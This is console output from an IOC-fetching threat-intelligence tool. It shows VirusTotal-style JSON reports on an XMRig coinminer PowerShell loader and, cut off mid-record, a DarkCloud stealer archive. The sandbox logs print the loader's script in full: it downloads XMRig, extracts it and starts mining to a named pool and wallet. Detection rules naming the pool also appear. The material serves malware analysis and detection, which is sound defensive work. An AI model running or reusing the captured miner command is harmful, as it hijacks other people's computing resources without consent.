```
Fetching latest IOC stream from Google Threat Intelligence...

Received 10 new IOCs
Displaying top 3 IOCs:
[
  {
    "id": "9c53adc7d00f345086615856cc1af620e42f5a17470510f449155236da5a2437",
    "type": "file",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/9c53adc7d00f345086615856cc1af620e42f5a17470510f449155236da5a2437"
    },
    "attributes": {
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "malicious",
          "malware_classification": [
            "MALWARE",
            "EVADER"
          ],
          "sandbox_name": "Zenbox",
          "malware_names": [
            "Xmrig"
          ],
          "confidence": 80
        }
      },
      "threat_severity": {
        "version": 5,
        "threat_severity_level": "SEVERITY_NONE",
        "threat_severity_data": {
          "num_av_detections": 3
        },
        "last_analysis_date": "1754478129",
        "level_description": "Severity NONE because the file has no Google antivirus detections and no bad network activity"
      },
      "md5": "a545efc21fb685af54b7c45969df630d",
      "type_tag": "powershell",
      "sigma_analysis_stats": {
        "critical": 1,
        "high": 2,
        "medium": 2,
        "low": 1
      },
      "downloadable": true,
      "powershell_info": {
        "cmdlets": [
          "expand-archive",
          "get-ciminstance",
          "invoke-webrequest"
        ]
      },
      "names": [
        "installer.ps1"
      ],
      "exiftool": {
        "MIMEType": "text/plain",
        "FileType": "TXT",
        "WordCount": "28",
        "LineCount": "6",
        "MIMEEncoding": "us-ascii",
        "FileTypeExtension": "txt",
        "Newlines": "Unix LF"
      },
      "tags": [
        "powershell",
        "url-pattern",
        "calls-wmi",
        "detect-debug-environment",
        "long-sleeps"
      ],
      "crowdsourced_ids_results": [
        {
          "rule_category": "Crypto Currency Mining Activity Detected",
          "alert_severity": "medium",
          "rule_msg": "ET COINMINER CoinMiner Domain in DNS Lookup (pool .hashvault .pro)",
          "rule_id": "1:2036289",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_raw": "alert dns $HOME_NET any -> any any (msg:\"ET COINMINER CoinMiner Domain in DNS Lookup (pool .hashvault .pro)\"; dns.query; content:\"pool.hashvault.pro\"; nocase; bsize:18; classtype:coin-mining; sid:2036289; rev:1; metadata:created_at 2022_04_21, performance_impact Significant, confidence High, signature_severity Major, updated_at 2022_04_21;)"
        }
      ],
      "times_submitted": 1,
      "last_analysis_results": {
        "Bkav": {
          "method": "blacklist",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Lionic": {
          "method": "blacklist",
          "engine_name": "Lionic",
          "engine_version": "8.16",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "MicroWorld-eScan": {
          "method": "blacklist",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "ClamAV": {
          "method": "blacklist",
          "engine_name": "ClamAV",
          "engine_version": "1.4.3.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "CTX": {
          "method": "blacklist",
          "engine_name": "CTX",
          "engine_version": "2024.8.29.1",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "CAT-QuickHeal": {
          "method": "blacklist",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "engine_update": "20250805",
          "category": "undetected",
          "result": null
        },
        "Skyhigh": {
          "method": "blacklist",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "ALYac": {
          "method": "blacklist",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.10",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Malwarebytes": {
          "method": "blacklist",
          "engine_name": "Malwarebytes",
          "engine_version": "3.1.0.150",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Zillya": {
          "method": "blacklist",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5418",
          "engine_update": "20250805",
          "category": "undetected",
          "result": null
        },
        "Sangfor": {
          "method": "blacklist",
          "engine_name": "Sangfor",
          "engine_version": "2.22.3.0",
          "engine_update": "20250804",
          "category": "undetected",
          "result": null
        },
        "K7AntiVirus": {
          "method": "blacklist",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.252.56606",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "K7GW": {
          "method": "blacklist",
          "engine_name": "K7GW",
          "engine_version": "12.252.56607",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "CrowdStrike": {
          "method": "blacklist",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "engine_update": "20230417",
          "category": "undetected",
          "result": null
        },
        "Baidu": {
          "method": "blacklist",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "engine_update": "20190318",
          "category": "undetected",
          "result": null
        },
        "VirIT": {
          "method": "blacklist",
          "engine_name": "VirIT",
          "engine_version": "9.5.1012",
          "engine_update": "20250805",
          "category": "undetected",
          "result": null
        },
        "Symantec": {
          "method": "blacklist",
          "engine_name": "Symantec",
          "engine_version": "1.22.0.0",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "CL.XMRig!gen1"
        },
        "ESET-NOD32": {
          "method": "blacklist",
          "engine_name": "ESET-NOD32",
          "engine_version": "31647",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "TrendMicro-HouseCall": {
          "method": "blacklist",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "24.550.0.1002",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Avast": {
          "method": "blacklist",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Cynet": {
          "method": "blacklist",
          "engine_name": "Cynet",
          "engine_version": "4.0.3.4",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Kaspersky": {
          "method": "blacklist",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "not-a-virus:HEUR:RiskTool.Script.BitMiner.gen"
        },
        "BitDefender": {
          "method": "blacklist",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "NANO-Antivirus": {
          "method": "blacklist",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.170.26895",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "SUPERAntiSpyware": {
          "method": "blacklist",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "engine_update": "20250805",
          "category": "undetected",
          "result": null
        },
        "Tencent": {
          "method": "blacklist",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Emsisoft": {
          "method": "blacklist",
          "engine_name": "Emsisoft",
          "engine_version": "2024.8.0.61147",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "F-Secure": {
          "method": "blacklist",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "DrWeb": {
          "method": "blacklist",
          "engine_name": "DrWeb",
          "engine_version": "7.0.69.6040",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "VIPRE": {
          "method": "blacklist",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "engine_update": "20250805",
          "category": "undetected",
          "result": null
        },
        "TrendMicro": {
          "method": "blacklist",
          "engine_name": "TrendMicro",
          "engine_version": "24.550.0.1002",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "McAfeeD": {
          "method": "blacklist",
          "engine_name": "McAfeeD",
          "engine_version": "1.2.0.10275",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "CMC": {
          "method": "blacklist",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Sophos": {
          "method": "blacklist",
          "engine_name": "Sophos",
          "engine_version": "3.0.3.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "huorong": {
          "method": "blacklist",
          "engine_name": "huorong",
          "engine_version": "dba5935:dba5935:0bbc9f6:0bbc9f6",
          "engine_update": "20250805",
          "category": "undetected",
          "result": null
        },
        "GData": {
          "method": "blacklist",
          "engine_name": "GData",
          "engine_version": "GD:27.41326AVA:64.29602",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "PowerShell.Application.CoinminerLoader.A"
        },
        "Jiangmin": {
          "method": "blacklist",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "engine_update": "20250805",
          "category": "undetected",
          "result": null
        },
        "Varist": {
          "method": "blacklist",
          "engine_name": "Varist",
          "engine_version": "6.6.1.3",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Avira": {
          "method": "blacklist",
          "engine_name": "Avira",
          "engine_version": "8.3.3.22",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Antiy-AVL": {
          "method": "blacklist",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Kingsoft": {
          "method": "blacklist",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Gridinsoft": {
          "method": "blacklist",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.222.174",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Xcitium": {
          "method": "blacklist",
          "engine_name": "Xcitium",
          "engine_version": "37935",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Arcabit": {
          "method": "blacklist",
          "engine_name": "Arcabit",
          "engine_version": "2025.0.0.23",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "ViRobot": {
          "method": "blacklist",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "ZoneAlarm": {
          "method": "blacklist",
          "engine_name": "ZoneAlarm",
          "engine_version": "6.18-106783195",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Microsoft": {
          "method": "blacklist",
          "engine_name": "Microsoft",
          "engine_version": "1.1.25060.6",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Google": {
          "method": "blacklist",
          "engine_name": "Google",
          "engine_version": "1754474449",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "AhnLab-V3": {
          "method": "blacklist",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.28.0.10568",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Acronis": {
          "method": "blacklist",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "engine_update": "20240328",
          "category": "undetected",
          "result": null
        },
        "VBA32": {
          "method": "blacklist",
          "engine_name": "VBA32",
          "engine_version": "5.3.2",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "TACHYON": {
          "method": "blacklist",
          "engine_name": "TACHYON",
          "engine_version": "2025-08-06.02",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Zoner": {
          "method": "blacklist",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Rising": {
          "method": "blacklist",
          "engine_name": "Rising",
          "engine_version": "25.0.0.28",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Yandex": {
          "method": "blacklist",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "TrellixENS": {
          "method": "blacklist",
          "engine_name": "TrellixENS",
          "engine_version": "6.0.6.653",
          "engine_update": "20250805",
          "category": "undetected",
          "result": null
        },
        "Ikarus": {
          "method": "blacklist",
          "engine_name": "Ikarus",
          "engine_version": "6.4.16.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "MaxSecure": {
          "method": "blacklist",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "engine_update": "20250805",
          "category": "undetected",
          "result": null
        },
        "Fortinet": {
          "method": "blacklist",
          "engine_name": "Fortinet",
          "engine_version": "7.0.30.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "AVG": {
          "method": "blacklist",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Panda": {
          "method": "blacklist",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "engine_update": "20250805",
          "category": "undetected",
          "result": null
        },
        "alibabacloud": {
          "method": "blacklist",
          "engine_name": "alibabacloud",
          "engine_version": "2.2.0",
          "engine_update": "20250321",
          "category": "undetected",
          "result": null
        },
        "google_safebrowsing": {
          "method": "blacklist",
          "engine_name": "google_safebrowsing",
          "engine_version": "1.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Avast-Mobile": {
          "method": "blacklist",
          "engine_name": "Avast-Mobile",
          "engine_version": "250806-02",
          "engine_update": "20250806",
          "category": "type-unsupported",
          "result": null
        },
        "SymantecMobileInsight": {
          "method": "blacklist",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "engine_update": "20250124",
          "category": "type-unsupported",
          "result": null
        },
        "BitDefenderFalx": {
          "method": "blacklist",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "engine_update": "20250416",
          "category": "type-unsupported",
          "result": null
        },
        "DeepInstinct": {
          "method": "blacklist",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "engine_update": "20250806",
          "category": "type-unsupported",
          "result": null
        },
        "Elastic": {
          "method": "blacklist",
          "engine_name": "Elastic",
          "engine_version": "4.0.219",
          "engine_update": "20250729",
          "category": "type-unsupported",
          "result": null
        },
        "APEX": {
          "method": "blacklist",
          "engine_name": "APEX",
          "engine_version": "6.683",
          "engine_update": "20250804",
          "category": "type-unsupported",
          "result": null
        },
        "Paloalto": {
          "method": "blacklist",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "engine_update": "20250806",
          "category": "type-unsupported",
          "result": null
        },
        "Trapmine": {
          "method": "blacklist",
          "engine_name": "Trapmine",
          "engine_version": "4.0.4.0",
          "engine_update": "20250721",
          "category": "type-unsupported",
          "result": null
        },
        "Alibaba": {
          "method": "blacklist",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "engine_update": "20190527",
          "category": "type-unsupported",
          "result": null
        },
        "Webroot": {
          "method": "blacklist",
          "engine_name": "Webroot",
          "engine_version": "1.9.0.8",
          "engine_update": "20250227",
          "category": "type-unsupported",
          "result": null
        },
        "Cylance": {
          "method": "blacklist",
          "engine_name": "Cylance",
          "engine_version": "3.0.0.0",
          "engine_update": "20250805",
          "category": "type-unsupported",
          "result": null
        },
        "SentinelOne": {
          "method": "blacklist",
          "engine_name": "SentinelOne",
          "engine_version": "25.1.1.1",
          "engine_update": "20250114",
          "category": "type-unsupported",
          "result": null
        },
        "tehtris": {
          "method": "blacklist",
          "engine_name": "tehtris",
          "engine_version": null,
          "engine_update": "20250806",
          "category": "type-unsupported",
          "result": null
        },
        "Trustlook": {
          "method": "blacklist",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "engine_update": "20250806",
          "category": "type-unsupported",
          "result": null
        }
      },
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "filecondis": {
        "raw_md5": "ecd58cad5b4fcc3571c6282a9818266e",
        "dhash": "bb00a6b28a959294"
      },
      "type_tags": [
        "source",
        "powershell",
        "ps",
        "ps1"
      ],
      "first_submission_date": 1754478088,
      "meaningful_name": "installer.ps1",
      "magic": "ASCII text, with very long lines (315u)",
      "type_extension": "ps1",
      "sigma_analysis_results": [
        {
          "rule_level": "critical",
          "rule_id": "c9f2b527fcecda6141fde1caee187052676355bc055141a8caa6c22482fca3ad",
          "rule_source": "Joe Security Rule Set (GitHub)",
          "rule_title": "Xmrig",
          "rule_description": "Detect Xmrig",
          "rule_author": "Joe Security",
          "match_context": [
            {
              "values": {
                "Product": "XMRig",
                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
                "OriginalFileName": "xmrig.exe",
                "Hashes": "SHA1=2786C144B232E5AE17411409395565ED6DCB064B,MD5=4D648AF4AE7EC56350571DB5FD4F0009,SHA256=F29D673B032F7FF763DEC032AEFD6C5759A1583B211625F7F770017BEDF03689,IMPHASH=3A3643DED1FEDFEE82A3324C3DB3BF43",
                "Description": "XMRig miner",
                "EventID": "1",
                "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"C:\\Users\\Bruno\\Desktop\\installer.ps1\"",
                "CommandLine": "\"C:\\Users\\Bruno\\Desktop\\xmrig\\xmrig-6.24.0\\xmrig.exe\" --url pool.hashvault.pro:443 --user 8AdDAwd7vZpPJvn5gVULXFBAvQeudVchgJGdH47pWaBvPjRmafuToc7Ghsoh6qAVJShUEjEz5GqLQcbjgWswsK7VTKMkefV --pass all-in-one --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --cpu-priority 5 -t 1 1",
                "FileVersion": "6.24.0",
                "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "IntegrityLevel": "High",
                "Image": "C:\\Users\\Bruno\\Desktop\\xmrig\\xmrig-6.24.0\\xmrig.exe",
                "Company": "www.xmrig.com"
              }
            }
          ]
        },
        {
          "rule_level": "high",
          "rule_id": "6e6298fff951b11ea6aa772fe7d022e50af3068aa7254be68850f49e45e0ed13",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Vulnerable WinRing0 Driver Load",
          "rule_description": "Detects the load of a signed WinRing0 driver often used by threat actors, crypto miners (XMRIG) or malware for privilege escalation",
          "rule_author": "Florian Roth (Nextron Systems)",
          "match_context": [
            {
              "values": {
                "Hashes": "SHA1=D25340AE8E92A6D29F599FEF426A2BC1B5217299,MD5=0C0195C48B6B8582FA6F6373032118DA,SHA256=11BD2C9F9E2397C9A16E0990E4ED2CF0679498FE0FD418A3DFDAC60B5C160EE5,IMPHASH=D41FA95D4642DC981F10DE36F4DC8CD7",
                "SignatureStatus": "Valid",
                "ImageLoaded": "C:\\Users\\Bruno\\Desktop\\xmrig\\xmrig-6.24.0\\WinRing0x64.sys",
                "Signature": "Noriyuki MIYAZAKI",
                "Signed": "true",
                "EventID": "6"
              }
            }
          ]
        },
        {
          "rule_level": "high",
          "rule_id": "efe6f377eb5896688f0baa7d44db4fc8d0639fa43f0d3dbb262bde8a7eb7b453",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Vulnerable Driver Load",
          "rule_description": "Detects loading of known vulnerable drivers via their hash.",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)",
          "match_context": [
            {
              "values": {
                "Hashes": "SHA1=D25340AE8E92A6D29F599FEF426A2BC1B5217299,MD5=0C0195C48B6B8582FA6F6373032118DA,SHA256=11BD2C9F9E2397C9A16E0990E4ED2CF0679498FE0FD418A3DFDAC60B5C160EE5,IMPHASH=D41FA95D4642DC981F10DE36F4DC8CD7",
                "SignatureStatus": "Valid",
                "Signed": "true",
                "ImageLoaded": "C:\\Users\\Bruno\\Desktop\\xmrig\\xmrig-6.24.0\\WinRing0x64.sys",
                "Signature": "Noriyuki MIYAZAKI",
                "EventID": "6"
              }
            }
          ]
        },
        {
          "rule_level": "medium",
          "rule_id": "6291f85314c7d9966be831c56d3cdfb30f42c84f599273e73dac5c95e1122abf",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Usage Of Web Request Commands And Cmdlets - ScriptBlock",
          "rule_description": "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs",
          "rule_author": "James Pemberton / @4A616D6573",
          "match_context": [
            {
              "values": {
                "ScriptBlockText": "$threads = (Get-CimInstance -ClassName Win32_Processor).NumberOfLogicalProcessors\r\n\r\nInvoke-WebRequest -Uri \"https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip\" -OutFile \"xmrig.zip\"\r\nExpand-Archive xmrig.zip\r\n\r\n.\\xmrig\\xmrig-6.24.0\\xmrig.exe --url pool.hashvault.pro:443 --user 8AdDAwd7vZpPJvn5gVULXFBAvQeudVchgJGdH47pWaBvPjRmafuToc7Ghsoh6qAVJShUEjEz5GqLQcbjgWswsK7VTKMkefV --pass all-in-one --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb364 [TRUNCATED]",
                "Path": "C:\\Users\\Bruno\\Desktop\\installer.ps1",
                "ScriptBlockId": "c54c53fd-7dbe-49dc-ac79-41750ec3dbe7",
                "MessageTotal": "1",
                "MessageNumber": "1",
                "EventID": "4104"
              }
            },
            {
              "values": {
                "ScriptBlockText": "$threads = (Get-CimInstance -ClassName Win32_Processor).NumberOfLogicalProcessors\r\n\r\nInvoke-WebRequest -Uri \"https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip\" -OutFile \"xmrig.zip\"\r\nExpand-Archive xmrig.zip\r\n\r\n.\\xmrig\\xmrig-6.24.0\\xmrig.exe --url pool.hashvault.pro:443 --user 8AdDAwd7vZpPJvn5gVULXFBAvQeudVchgJGdH47pWaBvPjRmafuToc7Ghsoh6qAVJShUEjEz5GqLQcbjgWswsK7VTKMkefV --pass all-in-one --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb364 [TRUNCATED]",
                "Path": "C:\\Users\\Bruno\\Desktop\\installer.ps1",
                "ScriptBlockId": "0834ce26-0f43-4f29-be96-d8c7e10083d4",
                "MessageTotal": "1",
                "EventID": "4104",
                "MessageNumber": "1"
              }
            }
          ]
        },
        {
          "rule_level": "medium",
          "rule_id": "bda626dd3bfb65bcce23cf31a18f15b58628dc48b2bb5cd9fe5f9ea5f9a3cc8c",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Potential Binary Or Script Dropper Via PowerShell",
          "rule_description": "Detects PowerShell creating a binary executable or a script file.",
          "rule_author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
          "match_context": [
            {
              "values": {
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "EventID": "11",
                "TargetFilename": "C:\\Users\\Bruno\\Desktop\\xmrig\\xmrig-6.24.0\\benchmark_10M.cmd"
              }
            },
            {
              "values": {
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "TargetFilename": "C:\\Users\\Bruno\\Desktop\\xmrig\\xmrig-6.24.0\\benchmark_1M.cmd",
                "EventID": "11"
              }
            },
            {
              "values": {
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "EventID": "11",
                "TargetFilename": "C:\\Users\\Bruno\\Desktop\\xmrig\\xmrig-6.24.0\\pool_mine_example.cmd"
              }
            },
            {
              "values": {
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "TargetFilename": "C:\\Users\\Bruno\\Desktop\\xmrig\\xmrig-6.24.0\\rtm_ghostrider_example.cmd",
                "EventID": "11"
              }
            },
            {
              "values": {
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "TargetFilename": "C:\\Users\\Bruno\\Desktop\\xmrig\\xmrig-6.24.0\\solo_mine_example.cmd",
                "EventID": "11"
              }
            }
          ]
        },
        {
          "rule_level": "low",
          "rule_id": "c085cde9af85b182e783b8d7b42d66d3d0efe08696b4fe7946da3d5d1a2cd51e",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Potential PowerShell Obfuscation Using Alias Cmdlets",
          "rule_description": "Detects Set-Alias or New-Alias cmdlet usage. Which can be use as a mean to obfuscate PowerShell scripts",
          "rule_author": "frack113",
          "match_context": [
            {
              "values": {
                "ScriptBlockText": "Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
                "Path": "",
                "ScriptBlockId": "ecb2cff7-09ca-42d9-9650-8e372b5dd1d0",
                "MessageTotal": "1",
                "MessageNumber": "1",
                "EventID": "4104"
              }
            },
            {
              "values": {
                "ScriptBlockText": "Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
                "MessageTotal": "1",
                "ScriptBlockId": "bbbc67d9-26b1-403c-b72f-36aca8213dc8",
                "Path": "",
                "EventID": "4104",
                "MessageNumber": "1"
              }
            },
            {
              "values": {
                "ScriptBlockText": "Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
                "Path": "",
                "ScriptBlockId": "b9ef96d9-1414-43b7-950e-84d5220e229c",
                "MessageTotal": "1",
                "MessageNumber": "1",
                "EventID": "4104"
              }
            },
            {
              "values": {
                "ScriptBlockText": "Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
                "Path": "",
                "ScriptBlockId": "c765987a-84f1-405b-bfc8-5d28148041f4",
                "MessageTotal": "1",
                "EventID": "4104",
                "MessageNumber": "1"
              }
            },
            {
              "values": {
                "ScriptBlockText": "Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
                "Path": "",
                "ScriptBlockId": "b48c5a4c-b71c-4082-ae2d-97f637e20a31",
                "MessageTotal": "1",
                "MessageNumber": "1",
                "EventID": "4104"
              }
            }
          ]
        }
      ],
      "last_modification_date": 1754485329,
      "last_submission_date": 1754478088,
      "last_analysis_date": 1754478088,
      "vhash": "582d78962f95e0e83dedde3d7da79655",
      "sha1": "cada878b370a3a328e276640df040c6055f3849a",
      "sigma_analysis_summary": {
        "Joe Security Rule Set (GitHub)": {
          "critical": 1,
          "high": 0,
          "medium": 0,
          "low": 0
        },
        "Sigma Integrated Rule Set (GitHub)": {
          "critical": 0,
          "high": 2,
          "medium": 2,
          "low": 1
        }
      },
      "size": 557,
      "available_tools": [],
      "sha256": "9c53adc7d00f345086615856cc1af620e42f5a17470510f449155236da5a2437",
      "magika": "POWERSHELL",
      "reputation": -11,
      "last_analysis_stats": {
        "malicious": 3,
        "suspicious": 0,
        "undetected": 60,
        "harmless": 0,
        "timeout": 0,
        "confirmed-timeout": 0,
        "failure": 0,
        "type-unsupported": 14
      },
      "ssdeep": "12:6o2W5VrEJ/WyG6T8myy7pbMCREDLYH55bFXYOuOsO7guISVdd32sno:6or1Pfu8myyvY8H5BFXYNE7/vV/Goo",
      "crowdsourced_yara_results": [
        {
          "ruleset_id": "0005c4aa9c",
          "ruleset_version": "0005c4aa9c|1d926845269a3ac8de0431da133950390b5cced3",
          "ruleset_name": "crime_crypto_miner",
          "rule_name": "SUSP_LNX_SH_CryptoMiner_Indicators_Dec20_1",
          "match_date": 1754478094,
          "description": "Detects helper script used in a crypto miner campaign",
          "author": "Florian Roth (Nextron Systems)",
          "source": "https://github.com/Neo23x0/signature-base"
        }
      ],
      "crowdsourced_ids_stats": {
        "high": 0,
        "medium": 1,
        "low": 0,
        "info": 0
      },
      "tlsh": "T1EBF0203261484464C7DEC2907E6BA38B14130990EF8BBBEC88F3B10421AA133A5C6115",
      "type_description": "Powershell",
      "unique_sources": 1,
      "gti_assessment": {
        "contributing_factors": {
          "matched_malicious_yara": true,
          "gti_confidence_score": 19,
          "malicious_sandbox_verdict": true
        },
        "verdict": {
          "value": "VERDICT_UNDETECTED"
        },
        "threat_score": {
          "value": 1
        },
        "severity": {
          "value": "SEVERITY_NONE"
        },
        "description": "This indicator did not match our detection criteria and there is currently no evidence of malicious activity."
      }
    },
    "context_attributes": {
      "notification_id": "23074586377",
      "origin": "subscriptions",
      "notification_date": 1754559927,
      "sources": [
        {
          "id": "44a70198ab671bd7435e0ab51641e14d965b141c1c5449f795a9a3943b309e8e",
          "type": "collection",
          "label": "XMRig"
        }
      ],
      "tags": [],
      "hunting_info": null
    }
  },
  {
    "id": "9de1c31e8218363945e54e623a2c8ffbf3895bdbc3c7faed98690b794b149b9c",
    "type": "file",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/9de1c31e8218363945e54e623a2c8ffbf3895bdbc3c7faed98690b794b149b9c"
    },
    "attributes": {
      "sandbox_verdicts": {
        "CAPE Sandbox": {
          "category": "malicious",
          "malware_classification": [
            "MALWARE"
          ],
          "sandbox_name": "CAPE Sandbox",
          "malware_names": [
            "A310Logger",
            "DarkCloud"
          ]
        },
        "Zenbox": {
          "category": "malicious",
          "malware_classification": [
            "MALWARE",
            "STEALER",
            "TROJAN",
            "EVADER",
            "RAT"
          ],
          "sandbox_name": "Zenbox",
          "malware_names": [
            "DarkCloud"
          ],
          "confidence": 100
        }
      },
      "threat_severity": {
        "version": 5,
        "threat_severity_level": "SEVERITY_MEDIUM",
        "threat_severity_data": {
          "popular_threat_category": "trojan",
          "num_gav_detections": 3
        },
        "last_analysis_date": "1754539135",
        "level_description": "Severity MEDIUM because it was considered trojan."
      },
      "md5": "f62f0b5bbd0396964e7e266810688f20",
      "type_tag": "rar",
      "sigma_analysis_stats": {
        "critical": 0,
        "high": 0,
        "medium": 1,
        "low": 1
      },
      "downloadable": true,
      "names": [
        "Purchase_Order_070825.rar",
        "/tmp/eml_attach_for_scan/f62f0b5bbd0396964e7e266810688f20.file"
